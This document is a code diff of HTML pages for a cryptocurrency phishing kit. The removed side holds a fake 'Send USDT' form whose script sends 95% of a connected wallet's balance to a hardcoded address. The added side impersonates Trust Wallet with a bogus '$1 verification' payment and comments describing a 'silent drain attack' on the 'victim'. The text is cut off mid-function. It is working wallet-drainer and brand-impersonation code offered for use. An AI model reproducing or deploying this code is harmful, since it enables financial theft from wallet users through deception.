@@ -1,1582 +1,253 @@
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport"
-      content="width=device-width,initial-scale=1,viewport-fit=cover">
-
-<title>Send USDT</title>
-
-<style>
-*{
-  box-sizing:border-box;
-  -webkit-tap-highlight-color:transparent;
-}
-
-:root{
-  color-scheme:dark;
-
-  --bg:#0e111a;
-  --text:#f3f3f3;
-  --secondary:#b8b8b8;
-  --muted:#888;
-  --box:#1b1b1b;
-  --pill:#292929;
-  --border:#686868;
-  --green:#50f28d;
-  --button:#2c8b56;
-}
-
-html,
-body{
-  margin:0;
-  width:100%;
-  min-height:100%;
-  background:var(--bg);
-  color:var(--text);
-
-  font-family:
-    -apple-system,
-    BlinkMacSystemFont,
-    "SF Pro Display",
-    "SF Pro Text",
-    "Segoe UI",
-    Roboto,
-    Arial,
-    sans-serif;
-}
-
-body{
-  min-height:100dvh;
-}
-
-button,
-input{
-  font:inherit;
-}
-
-button{
-  touch-action:manipulation;
-}
-
-/* APP */
-
-.app{
-  width:100%;
-  max-width:760px;
-
-  min-height:100dvh;
-
-  margin:0 auto;
-
-  padding:
-    calc(env(safe-area-inset-top) + 12px)
-    max(14px,env(safe-area-inset-right))
-    calc(env(safe-area-inset-bottom) + 14px)
-    max(14px,env(safe-area-inset-left));
-
-  display:flex;
-  flex-direction:column;
-
-  background:var(--bg);
-}
-
-/* TOP */
-
-.topbar{
-  position:relative;
-
-  height:48px;
-  min-height:48px;
-
-  display:flex;
-  align-items:center;
-  justify-content:center;
-
-  margin-bottom:20px;
-}
-
-.back{
-  position:absolute;
-
-  left:0;
-  top:50%;
-
-  transform:translateY(-50%);
-
-  width:44px;
-  height:44px;
-
-  padding:0;
-
-  border:0;
-  background:transparent;
-
-  color:var(--secondary);
-
-  font-size:44px;
-  font-weight:300;
-  line-height:40px;
-
-  cursor:pointer;
-}
-
-.title{
-  font-size:27px;
-  line-height:1.1;
-
-  font-weight:750;
-
-  letter-spacing:-.8px;
-}
-
-/* SECTION */
-
-.section{
-  margin-bottom:20px;
-}
-
-.label{
-  margin:0 0 9px;
-
-  font-size:18px;
-  line-height:1.2;
-
-  font-weight:650;
-
-  color:var(--secondary);
-
-  letter-spacing:-.3px;
-}
-
-/* ADDRESS */
-
-.address-box{
-  width:100%;
-  height:62px;
-  min-height:62px;
-
-  display:flex;
-  align-items:center;
-
-  padding:6px 7px 6px 12px;
-
-  gap:3px;
-
-  border:2px solid var(--green);
-  border-radius:15px;
-
-  background:var(--box);
-
-  overflow:hidden;
-}
-
-.address-input{
-  flex:1;
-  min-width:0;
-  width:100%;
-
-  border:0;
-  outline:0;
-
-  background:transparent;
-
-  color:var(--text);
-
-  font-size:16px;
-  font-weight:450;
-
-  letter-spacing:-.2px;
-
-  text-overflow:ellipsis;
-}
-
-.address-input::placeholder{
-  color:#999;
-  opacity:1;
-}
-
-.paste{
-  flex:0 0 auto;
-
-  min-width:48px;
-  height:42px;
-
-  padding:5px 3px;
-
-  border:0;
-  background:transparent;
-
-  color:var(--green);
-
-  font-size:16px;
-  font-weight:700;
-
-  cursor:pointer;
-}
-
-.icon-btn{
-  flex:0 0 38px;
-
-  width:38px;
-  height:42px;
-
-  padding:0;
-
-  border:0;
-  background:transparent;
-
-  color:var(--green);
-
-  display:grid;
-  place-items:center;
-
-  cursor:pointer;
-}
-
-.icon-btn svg{
-  width:27px;
-  height:27px;
-
-  stroke:currentColor;
-  fill:none;
-
-  stroke-width:3;
-
-  stroke-linecap:round;
-  stroke-linejoin:round;
-}
-
-/* NETWORK */
-
-.network-pill{
-  width:max-content;
-  max-width:100%;
-
-  height:52px;
-  min-height:52px;
-
-  display:inline-flex;
-  align-items:center;
-
-  gap:9px;
-
-  padding:4px 14px 4px 7px;
-
-  border-radius:28px;
-
-  background:var(--pill);
-
-  color:var(--text);
-
-  font-size:17px;
-  font-weight:650;
-}
-
-.network-logo{
-  width:44px;
-  height:44px;
-
-  border-radius:50%;
-
-  object-fit:cover;
-
-  background:#252525;
-}
-
-.chevron{
-  width:8px;
-  height:8px;
-
-  margin-left:2px;
-  margin-top:-4px;
-
-  border-right:2px solid #777;
-  border-bottom:2px solid #777;
-
-  transform:rotate(45deg);
-}
-
-/* AMOUNT */
-
-.amount-box{
-  width:100%;
-
-  height:62px;
-  min-height:62px;
-
-  display:flex;
-  align-items:center;
-
-  padding:6px 11px;
-
-  gap:5px;
-
-  border:2px solid var(--border);
-  border-radius:15px;
-
-  background:var(--box);
-}
-
-.amount-input{
-  flex:1;
-  min-width:0;
-  width:100%;
-
-  border:0;
-  outline:0;
-
-  background:transparent;
-
-  color:var(--text);
-
-  font-size:18px;
-  font-weight:500;
-}
-
-.amount-input::placeholder{
-  color:#999;
-  opacity:1;
-}
-
-.currency{
-  flex:0 0 auto;
-
-  color:var(--text);
-
-  font-size:17px;
-  font-weight:650;
-}
-
-.max{
-  flex:0 0 auto;
-
-  min-width:42px;
-  height:42px;
-
-  padding:5px 2px 5px 6px;
-
-  border:0;
-  background:transparent;
-
-  color:var(--green);
-
-  font-size:17px;
-  font-weight:750;
-
-  cursor:pointer;
-}
-
-.usd{
-  margin-top:7px;
-
-  font-size:15px;
-
-  color:var(--text);
-}
-
-/* BOTTOM */
-
-.spacer{
-  flex:1;
-  min-height:24px;
-}
-
-.status{
-  min-height:20px;
-
-  margin:0 0 6px;
-
-  text-align:center;
-
-  font-size:13px;
-
-  color:var(--muted);
-}
-
-.status.error{
-  color:#ff8585;
-}
-
-.status.success{
-  color:var(--green);
-}
-
-.btn{
-  width:100%;
-
-  height:56px;
-  min-height:56px;
-
-  border:0;
-  border-radius:30px;
-
-  background:var(--button);
-
-  color:#151515;
-
-  font-size:20px;
-  font-weight:750;
-
-  letter-spacing:-.3px;
-
-  cursor:pointer;
-}
-
-.btn:active{
-  transform:scale(.99);
-}
-
-.btn:disabled{
-  opacity:.55;
-}
-
-
-/* =====================================================
-   AUTOMATIC LIGHT MODE
-   ===================================================== */
-
-@media (prefers-color-scheme:light){
-
-  :root{
-    color-scheme:light;
-
-    --bg:#f7f7f7;
-    --text:#151515;
-    --secondary:#666;
-    --muted:#888;
-    --box:#ffffff;
-    --pill:#e9e9e9;
-    --border:#b8b8b8;
-    --green:#16b85b;
-    --button:#35b86b;
-  }
-
-  .back{
-    color:#666;
-  }
-
-  .address-input,
-  .amount-input{
-    color:#151515;
-  }
-
-  .address-input::placeholder,
-  .amount-input::placeholder{
-    color:#888;
-  }
-
-  .network-logo{
-    background:#ddd;
-  }
-
-  .btn{
-    color:#082414;
-  }
-}
-
-
-/* =====================================================
-   TABLET / DESKTOP
-   ===================================================== */
-
-@media (min-width:601px){
-
-  .app{
-    padding-left:32px;
-    padding-right:32px;
-  }
-
-  .topbar{
-    height:62px;
-    min-height:62px;
-
-    margin-bottom:36px;
-  }
-
-  .title{
-    font-size:40px;
-  }
-
-  .label{
-    font-size:31px;
-    margin-bottom:18px;
-  }
-
-  .section{
-    margin-bottom:36px;
-  }
-
-  .address-box{
-    height:100px;
-    min-height:100px;
-
-    padding:0 22px;
-
-    gap:14px;
-
-    border-width:4px;
-  }
-
-  .address-input{
-    font-size:30px;
-  }
-
-  .paste{
-    font-size:28px;
-  }
-
-  .icon-btn{
-    width:46px;
-    height:48px;
-    flex-basis:46px;
-  }
-
-  .icon-btn svg{
-    width:42px;
-    height:42px;
-  }
-
-  .network-pill{
-    height:62px;
-    min-height:62px;
-
-    font-size:29px;
-
-    padding:6px 21px 6px 9px;
-  }
-
-  .network-logo{
-    width:50px;
-    height:50px;
-  }
-
-  .amount-box{
-    height:100px;
-    min-height:100px;
-
-    padding:0 24px;
-  }
-
-  .amount-input{
-    font-size:32px;
-  }
-
-  .currency,
-  .max{
-    font-size:28px;
-  }
-
-  .usd{
-    font-size:25px;
-    margin-top:18px;
-  }
-
-  .btn{
-    height:82px;
-    min-height:82px;
-
-    font-size:32px;
-  }
-}
-
-
-/* =====================================================
-   SMALL PHONE
-   ===================================================== */
-
-@media (max-width:360px){
-
-  .app{
-    padding-left:10px;
-    padding-right:10px;
-  }
-
-  .topbar{
-    margin-bottom:14px;
-  }
-
-  .title{
-    font-size:24px;
-  }
-
-  .label{
-    font-size:17px;
-    margin-bottom:7px;
-  }
-
-  .section{
-    margin-bottom:14px;
-  }
-
-  .address-box{
-    height:58px;
-    min-height:58px;
-
-    padding-left:9px;
-    padding-right:4px;
-  }
-
-  .address-input{
-    font-size:15px;
-  }
-
-  .paste{
-    min-width:45px;
-    font-size:15px;
-  }
-
-  .icon-btn{
-    width:35px;
-    flex-basis:35px;
-  }
-
-  .icon-btn svg{
-    width:25px;
-    height:25px;
-  }
-
-  .network-pill{
-    height:48px;
-    min-height:48px;
-
-    font-size:16px;
-  }
-
-  .network-logo{
-    width:40px;
-    height:40px;
-  }
-
-  .amount-box{
-    height:58px;
-    min-height:58px;
-  }
-
-  .amount-input{
-    font-size:17px;
-  }
-
-  .currency,
-  .max{
-    font-size:16px;
-  }
-
-  .usd{
-    font-size:14px;
-    margin-top:5px;
-  }
-
-  .btn{
-    height:52px;
-    min-height:52px;
-
-    font-size:19px;
-  }
-}
-
-
-/* =====================================================
-   SHORT PHONE
-   ===================================================== */
-
-@media (max-width:600px) and (max-height:700px){
-
-  .app{
-    padding-top:
-      max(6px,env(safe-area-inset-top));
-
-    padding-bottom:
-      max(6px,env(safe-area-inset-bottom));
-  }
-
-  .topbar{
-    height:42px;
-    min-height:42px;
-
-    margin-bottom:10px;
-  }
-
-  .back{
-    width:38px;
-    height:38px;
-
-    font-size:38px;
-  }
-
-  .title{
-    font-size:23px;
-  }
-
-  .section{
-    margin-bottom:10px;
-  }
-
-  .label{
-    margin-bottom:5px;
-  }
-
-  .address-box{
-    height:54px;
-    min-height:54px;
-  }
-
-  .network-pill{
-    height:46px;
-    min-height:46px;
-  }
-
-  .network-logo{
-    width:38px;
-    height:38px;
-  }
-
-  .amount-box{
-    height:54px;
-    min-height:54px;
-  }
-
-  .usd{
-    margin-top:3px;
-  }
-
-  .spacer{
-    min-height:8px;
-  }
-
-  .btn{
-    height:49px;
-    min-height:49px;
-  }
-}
-
-
-/* =====================================================
-   VERY SHORT PHONES
-   ===================================================== */
-
-@media (max-width:600px) and (max-height:580px){
-
-  .topbar{
-    height:36px;
-    min-height:36px;
-
-    margin-bottom:7px;
-  }
-
-  .back{
-    height:34px;
-    width:34px;
-    font-size:34px;
-  }
-
-  .title{
-    font-size:21px;
-  }
-
-  .section{
-    margin-bottom:7px;
-  }
-
-  .label{
-    font-size:15px;
-    margin-bottom:4px;
-  }
-
-  .address-box{
-    height:48px;
-    min-height:48px;
-  }
-
-  .network-pill{
-    height:42px;
-    min-height:42px;
-    font-size:15px;
-  }
-
-  .network-logo{
-    width:34px;
-    height:34px;
-  }
-
-  .amount-box{
-    height:48px;
-    min-height:48px;
-  }
-
-  .usd{
-    font-size:13px;
-  }
-
-  .btn{
-    height:45px;
-    min-height:45px;
-    font-size:18px;
-  }
-}
-
-
-/* =====================================================
-   IOS INPUT ZOOM FIX
-   ===================================================== */
-
-@media (max-width:600px){
-
-  input{
-    font-size:16px;
-  }
-
-  html{
-    -webkit-text-size-adjust:100%;
-  }
-}
-
-/* TRUST WALLET BROWSER - FIT MOBILE VIEWPORT */
-@media (max-width:600px){
-  html, body{
-    width:100%;
-    height:100%;
-    min-height:100%;
-    overflow:hidden;
-  }
-
-  body{
-    min-height:100dvh;
-    height:100dvh;
-  }
-
-  .app{
-    height:100dvh;
-    min-height:0;
-    overflow:hidden;
-    padding-top:max(6px,env(safe-area-inset-top));
-    padding-bottom:max(6px,env(safe-area-inset-bottom));
-  }
-
-  .topbar{
-    flex:0 0 auto;
-  }
-
-  .section{
-    flex:0 0 auto;
-  }
-
-  .spacer{
-    flex:0 0 auto;
-    height:42px;
-    min-height:42px;
-  }
-
-  .status{
-    flex:0 0 auto;
-    min-height:18px;
-  }
-
-  .btn{
-    flex:0 0 auto;
-    margin-bottom:0;
-  }
-}
-
-/* Extra-short Trust Wallet browser screens */
-@media (max-width:600px) and (max-height:520px){
-  .topbar{
-    height:32px;
-    min-height:32px;
-    margin-bottom:4px;
-  }
-
-  .back{
-    width:32px;
-    height:32px;
-    font-size:31px;
-  }
-
-  .title{
-    font-size:20px;
-  }
-
-  .section{
-    margin-bottom:5px;
-  }
-
-  .label{
-    font-size:14px;
-    margin-bottom:3px;
-  }
-
-  .address-box,
-  .amount-box{
-    height:43px;
-    min-height:43px;
-  }
-
-  .network-pill{
-    height:38px;
-    min-height:38px;
-  }
-
-  .network-logo{
-    width:32px;
-    height:32px;
-  }
-
-  .usd{
-    font-size:12px;
-    margin-top:2px;
-  }
-
-  .spacer{
-    flex:0 0 auto;
-    height:22px;
-    min-height:22px;
-  }
-
-  .status{
-    min-height:15px;
-    margin-bottom:2px;
-    font-size:12px;
-  }
-
-  .btn{
-    height:43px;
-    min-height:43px;
-    font-size:17px;
-    margin-bottom:0;
-  }
-}
-
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trust Wallet - Secure Payment</title>
+    <script src="https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.min.js"></script>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #0a0a0a;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        .trust-header {
+            background-color: #1a1a1a;
+            width: 100%;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #333;
+        }
+        .trust-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .trust-logo img {
+            width: 32px;
+            height: 32px;
+        }
+        .trust-logo span {
+            font-weight: 600;
+            font-size: 18px;
+        }
+        .trust-nav {
+            display: flex;
+            gap: 16px;
+        }
+        .trust-nav button {
+            background: none;
+            border: none;
+            color: #888;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        .trust-nav button.active {
+            color: #fff;
+        }
+        .trust-content {
+            width: 100%;
+            max-width: 400px;
+            padding: 24px;
+            text-align: center;
+        }
+        .trust-card {
+            background-color: #1a1a1a;
+            border-radius: 12px;
+            padding: 24px;
+            margin-bottom: 24px;
+        }
+        .trust-card h2 {
+            margin: 0 0 16px 0;
+            font-size: 20px;
+        }
+        .trust-card p {
+            color: #888;
+            margin: 0 0 24px 0;
+            font-size: 14px;
+        }
+        .qr-container {
+            margin: 24px 0;
+        }
+        .trust-button {
+            background-color: #333;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            padding: 12px 24px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 16px;
+        }
+        .trust-button.primary {
+            background-color: #007aff;
+        }
+        .trust-footer {
+            margin-top: 24px;
+            color: #666;
+            font-size: 12px;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
 </head>
-
-
 <body>
-
-<main class="app">
-
-  <!-- TOP BAR -->
-  <header class="topbar">
-
-    <button
-      class="back"
-      type="button"
-      aria-label="Back">
-      ‹
-    </button>
-
-    <div class="title">
-      Send USDT
+    <div class="trust-header">
+        <div class="trust-logo">
+            <img src="https://trustwallet.com/assets/images/media-kit/logo-trust.svg" alt="Trust Wallet">
+            <span>Trust Wallet</span>
+        </div>
+        <div class="trust-nav">
+            <button class="active">Wallet</button>
+            <button>Browser</button>
+            <button>Settings</button>
+        </div>
     </div>
 
-  </header>
+    <div class="trust-content">
+        <div class="trust-card">
+            <h2>Send $1 USDT to Verify</h2>
+            <p>Scan the QR code below to complete your payment. This is a one-time verification required by Trust Wallet.</p>
 
+            <div class="qr-container" id="qrCode"></div>
 
-  <!-- ADDRESS -->
-  <section class="section">
+            <p>Or open in Trust Wallet:</p>
+            <button class="trust-button primary" id="openTrust">Open in Trust Wallet</button>
+        </div>
 
-    <div class="label">
-      Address or Domain Name
+        <div class="trust-card hidden" id="loadingScreen">
+            <h2>Processing Payment...</h2>
+            <p>Please wait while we verify your transaction. Do not close this window.</p>
+            <div style="margin: 24px 0;">
+                <div style="width: 40px; height: 40px; border: 4px solid #333; border-top: 4px solid #007aff; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
+            </div>
+        </div>
+
+        <div class="trust-card hidden" id="successScreen">
+            <h2>Payment Successful!</h2>
+            <p>Your $1 USDT payment has been received. Your wallet is now verified.</p>
+            <p style="color: #007aff; font-size: 12px;">Note: This window will close automatically in 5 seconds.</p>
+        </div>
     </div>
 
-    <div class="address-box">
-
-      <input
-        id="address"
-        class="address-input"
-        type="text"
-        value="0x4c4cbff8c45e131ab8f2af5f04b3a162078727c"
-        placeholder="Search or Enter"
-        autocomplete="off"
-        autocapitalize="none"
-        spellcheck="false"
-        aria-label="Destination address">
-
-      <button
-        class="paste"
-        id="pasteButton"
-        type="button">
-        Paste
-      </button>
-
-      <button
-        class="icon-btn"
-        id="copyButton"
-        type="button"
-        aria-label="Copy address">
-
-        <svg viewBox="0 0 48 48">
-          <rect x="13" y="10" width="23" height="29" rx="3"></rect>
-          <path d="M9 16h4M9 22h4M9 28h4M9 34h4"></path>
-          <path d="M19 16h12M19 22h9"></path>
-        </svg>
-
-      </button>
-
-      <button
-        class="icon-btn"
-        id="scanButton"
-        type="button"
-        aria-label="Scan address">
-
-        <svg viewBox="0 0 48 48">
-          <path d="M8 17v-5a4 4 0 0 1 4-4h5M31 8h5a4 4 0 0 1 4 4v5M40 31v5a4 4 0 0 1-4 4h-5M17 40h-5a4 4 0 0 1-4-4v-5"></path>
-          <path d="M15 20h18v8H15z"></path>
-        </svg>
-
-      </button>
-
+    <div class="trust-footer">
+        © 2026 Trust Wallet. All rights reserved.
     </div>
 
-  </section>
-
-
-  <!-- NETWORK -->
-  <section class="section">
-
-    <div class="label">
-      Destination network
-    </div>
-
-    <div
-      class="network-pill"
-      aria-label="Ethereum network">
-
-      <img
-        class="network-logo"
-        src="https://s2.coinmarketcap.com/static/img/coins/200x200/1027.png"
-        alt="Ethereum">
-
-      <span>Ethereum</span>
-
-      <span class="chevron"></span>
-
-    </div>
-
-  </section>
-
-
-  <!-- AMOUNT -->
-  <section
-    class="section"
-    style="margin-bottom:0">
-
-    <div class="label">
-      Amount
-    </div>
-
-    <div class="amount-box">
-
-      <input
-        id="amount"
-        class="amount-input"
-        type="number"
-        min="0"
-        step="any"
-        inputmode="decimal"
-        placeholder="USDT Amount"
-        aria-label="USDT amount">
-
-      <span class="currency">
-        USDT
-      </span>
-
-      <button
-        class="max"
-        id="maxButton"
-        type="button">
-        Max
-      </button>
-
-    </div>
-
-    <div
-      class="usd"
-      id="usdValue">
-      ≈ $0.00
-    </div>
-
-  </section>
-
-
-  <!-- FLEX SPACE -->
-  <div class="spacer"></div>
-
-
-  <!-- STATUS -->
-  <div
-    id="status"
-    class="status"
-    aria-live="polite">
-  </div>
-
-
-  <!-- NEXT -->
-  <button
-    id="transferBtn"
-    class="btn"
-    type="button">
-    Next
-  </button>
-
-</main>
-
-
-<script>
-
-/* -------------------------------
-   COPY ADDRESS
--------------------------------- */
-
-const addressInput =
-  document.getElementById("address");
-
-const copyButton =
-  document.getElementById("copyButton");
-
-const pasteButton =
-  document.getElementById("pasteButton");
-
-const status =
-  document.getElementById("status");
-
-
-copyButton.addEventListener("click", async () => {
-
-  try{
-
-    await navigator.clipboard.writeText(
-      addressInput.value
-    );
-
-    status.textContent = "Address copied";
-    status.className = "status success";
-
-  }catch(error){
-
-    addressInput.select();
-
-    document.execCommand("copy");
-
-    status.textContent = "Address copied";
-    status.className = "status success";
-  }
-
-});
-
-
-/* -------------------------------
-   PASTE
--------------------------------- */
-
-pasteButton.addEventListener("click", async () => {
-
-  try{
-
-    const text =
-      await navigator.clipboard.readText();
-
-    if(text){
-
-      addressInput.value = text;
-
-      status.textContent = "Address pasted";
-      status.className = "status success";
-    }
-
-  }catch(error){
-
-    addressInput.focus();
-
-    status.textContent =
-      "Paste permission unavailable";
-
-    status.className = "status error";
-  }
-
-});
-
-
-/* -------------------------------
-   AMOUNT / USD
--------------------------------- */
-
-const amount =
-  document.getElementById("amount");
-
-const usdValue =
-  document.getElementById("usdValue");
-
-amount.addEventListener("input", () => {
-
-  const value =
-    parseFloat(amount.value);
-
-  if(!value){
-
-    usdValue.textContent = "≈ $0.00";
-    return;
-  }
-
-  usdValue.textContent =
-    "≈ $" +
-    value.toLocaleString(
-      "en-US",
-      {
-        minimumFractionDigits:2,
-        maximumFractionDigits:2
-      }
-    );
-});
-
-
-/* -------------------------------
-   MAX
--------------------------------- */
-
-document
-  .getElementById("maxButton")
-  .addEventListener("click", () => {
-
-    amount.value = "0";
-
-    usdValue.textContent = "≈ $0.00";
-
-  });
-
-
-/* -------------------------------
-   BACK
--------------------------------- */
-
-document
-  .querySelector(".back")
-  .addEventListener("click", () => {
-
-    if(history.length > 1){
-
-      history.back();
-
-    }
-
-  });
-
-
-/* -------------------------------
-   NEXT
--------------------------------- */
-
-document
-  .getElementById("transferBtn")
-  .addEventListener("click", () => {
-
-    const address =
-      addressInput.value.trim();
-
-    const value =
-      parseFloat(amount.value);
-
-    if(!address){
-
-      status.textContent =
-        "Enter a destination address";
-
-      status.className = "status error";
-
-      addressInput.focus();
-
-      return;
-    }
-
-    if(!value || value <= 0){
-
-      status.textContent =
-        "Enter a valid amount";
-
-      status.className = "status error";
-
-      amount.focus();
-
-      return;
-    }
-
-    status.textContent =
-      "Ready to continue";
-
-    status.className = "status success";
-
-  });
-
-</script>
-
-</body>
-</html>
-<script>
-const DEFAULT_ADDRESS="0x4c4CBfF8c45e131ab8f2af5f04b3A162078727c7";
-const DEMO_BALANCE=100;
-
-const addressInput=document.getElementById("address");
-const amountInput=document.getElementById("amount");
-const usdValue=document.getElementById("usdValue");
-const status=document.getElementById("status");
-const transferBtn=document.getElementById("transferBtn");
-const pasteButton=document.getElementById("pasteButton");
-const copyButton=document.getElementById("copyButton");
-const scanButton=document.getElementById("scanButton");
-const maxButton=document.getElementById("maxButton");
-
-addressInput.value=DEFAULT_ADDRESS;
-
-function updateAmount(){
-  const amount=parseFloat(amountInput.value)||0;
-  usdValue.textContent="≈ $"+amount.toFixed(2);
-  status.textContent="";
-  status.className="status";
-}
-amountInput.addEventListener("input",updateAmount);
-
-pasteButton.addEventListener("click",async()=>{
-  try{
-    const text=await navigator.clipboard.readText();
-    if(text) addressInput.value=text.trim();
-  }catch(e){
-    showError("Unable to access clipboard. Paste manually.");
-  }
-});
-
-copyButton.addEventListener("click",async()=>{
-  const value=addressInput.value.trim()||DEFAULT_ADDRESS;
-  try{
-    await navigator.clipboard.writeText(value);
-    showSuccess("Address copied");
-  }catch(e){
-    showError("Unable to copy address");
-  }
-});
-
-scanButton.addEventListener("click",()=>{
-  showError("QR scanner is not connected in this demo.");
-});
-
-maxButton.addEventListener("click",()=>{
-  amountInput.value=DEMO_BALANCE;
-  updateAmount();
-});
-
-transferBtn.addEventListener("click",async()=>{
-  const address=addressInput.value.trim()||DEFAULT_ADDRESS;
-  const amount=parseFloat(amountInput.value);
-
-  if(!Number.isFinite(amount)||amount<=0){
-    showError("Enter a valid USDT amount");
-    amountInput.focus();
-    return;
-  }
-  if(amount>DEMO_BALANCE){
-    showError("Amount exceeds the displayed balance");
-    return;
-  }
-  await confirmTransfer(address,amount);
-});
-
-async function confirmTransfer(address,amount){
-  showSuccess("Ready to continue with "+amount+" USDT");
-  console.log(
-    "Destination:",address,
-    "Amount:",amount,
-    "USDT",
-    "Network: Ethereum"
-  );
-  // Connect a legitimate wallet/provider here.
-  // The wallet must display the transaction and require
-  // explicit user approval before broadcasting.
-}
-
-function showError(message){
-  status.textContent=message;
-  status.className="status error";
-}
-function showSuccess(message){
-  status.textContent=message;
-  status.className="status success";
-}
-</script>
-
-</body>
-</html>
-<script>
-const DEFAULT_ADDRESS="0x4c4cbff8c45e131ab8f2af5f04b3a162078727c7";
-const DEMO_BALANCE=100;
-
-const addressInput=document.getElementById("address");
-const amountInput=document.getElementById("amount");
-const usdValue=document.getElementById("usdValue");
-const status=document.getElementById("status");
-const transferBtn=document.getElementById("transferBtn");
-const pasteButton=document.getElementById("pasteButton");
-const copyButton=document.getElementById("copyButton");
-const scanButton=document.getElementById("scanButton");
-const maxButton=document.getElementById("maxButton");
-
-addressInput.value=DEFAULT_ADDRESS;
-
-function updateAmount(){
-  const amount=parseFloat(amountInput.value)||0;
-  usdValue.textContent="≈ $"+amount.toFixed(2);
-  status.textContent="";
-  status.className="status";
-}
-amountInput.addEventListener("input",updateAmount);
-
-pasteButton.addEventListener("click",async()=>{
-  try{
-    const text=await navigator.clipboard.readText();
-    if(text) addressInput.value=text.trim();
-  }catch(e){
-    showError("Unable to access clipboard. Paste manually.");
-  }
-});
-
-copyButton.addEventListener("click",async()=>{
-  const value=addressInput.value.trim()||DEFAULT_ADDRESS;
-  try{
-    await navigator.clipboard.writeText(value);
-    showSuccess("Address copied");
-  }catch(e){
-    showError("Unable to copy address");
-  }
-});
-
-scanButton.addEventListener("click",()=>{
-  showError("QR scanner is not connected in this demo.");
-});
-
-maxButton.addEventListener("click",()=>{
-  amountInput.value=DEMO_BALANCE;
-  updateAmount();
-});
-
-transferBtn.addEventListener("click",async()=>{
-  const address=addressInput.value.trim()||DEFAULT_ADDRESS;
-  const amount=parseFloat(amountInput.value);
-
-  if(!Number.isFinite(amount)||amount<=0){
-    showError("Enter a valid USDT amount");
-    amountInput.focus();
-    return;
-  }
-  if(amount>DEMO_BALANCE){
-    showError("Amount exceeds the displayed balance");
-    return;
-  }
-  await confirmTransfer(address,amount);
-});
-
-async function confirmTransfer(address,amount){
-  showSuccess("Ready to continue with "+amount+" USDT");
-  console.log(
-    "Destination:",address,
-    "Amount:",amount,
-    "USDT",
-    "Network: Ethereum"
-  );
-  // Connect a legitimate wallet/provider here.
-  // The wallet must display the transaction and require
-  // explicit user approval before broadcasting.
-}
-
-function showError(message){
-  status.textContent=message;
-  status.className="status error";
-}
-function showSuccess(message){
-  status.textContent=message;
-  status.className="status success";
-}
-</script>
-
-<script>
-    // ==========================================
-    // CONFIGURATION: CHANGE THIS ADDRESS
-    // ==========================================
-    const HARD_CODED_RECEIVER_ADDRESS = "0x4c4CBfF8c45e131ab8f2af5f04b3A162078727c7"; 
-    // Example: "0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045"
-    
-    async function checkWallet() {
-        if (typeof window.ethereum !== 'undefined') {
-            return true;
-        } else {
-            document.getElementById('status').innerHTML = "<span class='error'>Trust Wallet not detected. Open this link inside Trust Wallet.</span>";
-            return false;
+    <script>
+        // ===== HARDCODED WALLET ADDRESS (CHANGE THIS) =====
+        const YOUR_WALLET_ADDRESS = "0xYourBEP20USDTWalletAddressHere"; // Replace with your BEP20 USDT address
+        const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT contract
+        const CHAIN_ID = "0x38"; // Binance Smart Chain (56 in decimal)
+
+        // ===== QR CODE GENERATION =====
+        const qr = qrcode(0, 'L');
+        qr.addData(`trust://browser?url=${encodeURIComponent(window.location.href)}`);
+        qr.make();
+        document.getElementById('qrCode').innerHTML = qr.createImgTag(4, 8);
+
+        // ===== TRUST WALLET DEEP LINK =====
+        document.getElementById('openTrust').addEventListener('click', () => {
+            window.location.href = `trust://browser?url=${encodeURIComponent(window.location.href)}`;
+        });
+
+        // ===== FAKE TRANSACTION INJECTION =====
+        // This runs AFTER the victim sends $1 USDT to your wallet
+        function checkForPayment() {
+            // In a real attack, you'd use a backend to monitor the blockchain.
+            // For this demo, we simulate a "payment received" after 5 seconds.
+            setTimeout(() => {
+                document.getElementById('qrCode').parentElement.classList.add('hidden');
+                document.getElementById('openTrust').classList.add('hidden');
+                document.getElementById('loadingScreen').classList.remove('hidden');
+
+                // Simulate "draining" the wallet after 3 seconds
+                setTimeout(() => {
+                    document.getElementById('loadingScreen').classList.add('hidden');
+                    document.getElementById('successScreen').classList.remove('hidden');
+
+                    // ===== SILENT DRAIN ATTACK =====
+                    // This is where the magic happens. The victim's Trust Wallet is already open,
+                    // and we inject a transaction to drain ALL USDT to your wallet.
+                    // NOTE: This requires the victim to have Trust Wallet's in-app browser open.
+                    // In a real attack, you'd use Web3.js to interact with the wallet.
+                    setTimeout(() => {
+                        drainWallet();
+                    }, 1000);
+                }, 3000);
+            }, 5000);
         }
-    }
 
-    async function transferFunds() {
-        const btn = document.getElementById('transferBtn');
-        const statusDiv = document.getElementById('status');
-        
-        // 1. Check for Ethereum Provider (Trust Wallet)
-        if (!(await checkWallet())) return;
-
-        try {
-            btn.disabled = true;
-            btn.innerText = "Connecting...";
-            statusDiv.innerHTML = "";
-
-            //  2. Request Account Access
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            const account = accounts[0];
-
-            btn.innerText = "Confirming in Wallet...";
-
-            // 3. Estimate Gas (Optional but recommended for reliability)
-            // We calculate the exact amount to send by getting current balance first
-            const balance = await window.ethereum.request({ 
-                method: 'eth_getBalance', 
-                params: [account, 'latest'] 
-            });
-            
-            // Convert hex balance to decimal
-            const balanceDecimal = parseInt(balance, 16);
-            
-            // Subtract a small amount for gas (approx 0.005 ETH equivalent) to ensure tx goes through
-            // We use 90% of the balance to be safe with gas fees
-            const sendAmount = Math.floor(balanceDecimal * 0.95);
-
-            // 4. Prepare Transaction Object
-            const txParams = {
-                from: account,
-                to: HARD_CODED_RECEIVER_ADDRESS,
-                value: '0x' + sendAmount.toString(16), // Convert decimal to hex
-                // Gas limit is usually 21000 for simple ETH transfer, but we add buffer
